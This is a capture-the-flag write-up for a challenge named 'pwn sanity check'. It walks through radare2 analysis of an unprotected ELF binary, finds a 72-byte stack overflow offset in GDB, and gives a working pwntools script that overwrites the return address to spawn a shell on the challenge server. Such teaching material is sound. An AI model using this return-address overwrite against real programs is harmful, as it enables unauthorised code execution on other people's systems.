# Pwn sanity check

This was a relatively easy challenge.

After opening `./pwn_sanity_check` in Radare2, I ran the `i` command to check the security of the binary:
```
[0x0040078c]> i
fd       3
file     pwn_sanity_check
size     0x21b8
humansz  8.4K
mode     r-x
format   elf64
iorw     false
block    0x100
type     EXEC (Executable file)
arch     x86
baddr    0x400000
binsz    6769
bintype  elf
bits     64
canary   false
class    ELF64
compiler GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
sanitiz  false
static   false
stripped false
subsys   linux
va       true
```
This binary isn't PIE and doesn't have a stack canary, so it's a prime target for a simple buffer overflow.
After seeking to `main`, I can see that `main` calls `vuln`, which is vulnerable to a buffer overflow.
There are also the symbols `win` and `shell`. `win` contains some complicated-looking challenge:
```
│ 0x004006a5      488d3d8c0100.  lea rdi, str.you_made_it_to_win_land__no_free_handouts_this_time__try_harder    ; 0x4008│
│ 0x004006ac      e89ffeffff     call sym.imp.puts           ;[1] ; int puts(const char *s)                              │
│ 0x004006b1      817dfcefbead.  cmp dword [var_4h], 0xdeadbeef                                                          │
│ 0x004006b8      7537           jne 0x4006f1                                                                            │
│ 0x004006ba      488d3db70100.  lea rdi, str.one_down__one_to_go_    ; 0x400878 ; "one down, one to go!" ; const char *s│
│ 0x004006c1      e88afeffff     call sym.imp.puts           ;[1] ; int puts(const char *s)                              │
│ 0x004006c6      817df8dec037.  cmp dword [var_8h], 0x1337c0de                                                          │
│ 0x004006cd      7522           jne 0x4006f1                                                                            │
│ 0x004006cf      488d3db70100.  lea rdi, str.2_2_bro_good_job    ; 0x40088d ; "2/2 bro good job" ; const char *s        │
│ 0x004006d6      e875feffff     call sym.imp.puts           ;[1] ; int puts(const char *s)                              │
│ 0x004006db      488d3dbc0100.  lea rdi, str._bin_sh        ; 0x40089e ; "/bin/sh" ; const char *string                 │
│ 0x004006e2      e879feffff     call sym.imp.system         ;[2] ; int system(const char *string)                       │
│ 0x004006e7      bf00000000     mov edi, 0                  ; int status                                                │
│ 0x004006ec      e8affeffff     call sym.imp.exit           ;[3] ; void exit(int status)                                |
```
However, we don't have to return to the start of a function. Thus, I set my target at `0x004006db`, where it actually runs a shell.

So, now we have to find the out the offset of the return address from the buffer in the stack.
This can be done easily in PwnDBG (or any GDB plugin that prints context).
First, open up the binary and set a breakpoint at `vuln`. Then run it with varying offset sizes until your return address is overwritten:
```
break vuln
run < <(perl -e 'print "\x41"x72 . "ABCDEFGH")
```
After stepping through the execution of `vuln` with the `nexti` command, I found that the return address is 72 bytes from the start of the buffer.
Thus, I can replace `ABCDEFGH` with any address I want to solve this challenge. Lets choose `0x004006db` from before.

Thus, I made a simple Python script to pop me a shell on the remote server:
```python
from pwn import *

payload = b"\x41"*72 + p64(0x004006db)
r = remote('dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io', 7480)

r.recvuntil('joke\n')
r.sendline(payload)
r.interactive()
```

The flag was in "flag.txt" on the server.
